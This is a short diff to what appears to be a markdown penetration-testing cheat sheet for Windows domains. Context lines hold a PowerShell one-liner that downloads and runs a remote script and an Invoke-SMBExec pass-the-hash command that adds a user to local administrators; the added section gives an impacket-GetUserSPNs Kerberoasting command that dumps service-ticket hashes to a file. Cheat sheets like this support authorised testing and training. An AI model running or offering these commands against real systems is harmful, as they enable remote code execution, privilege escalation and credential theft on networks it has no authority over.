@@ -116,6 +116,11 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
 ```
 
+### Kerberoast
+
+```markdown
+impacket-GetUserSPNs -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast
+```
 
 
 ## Pentest Web
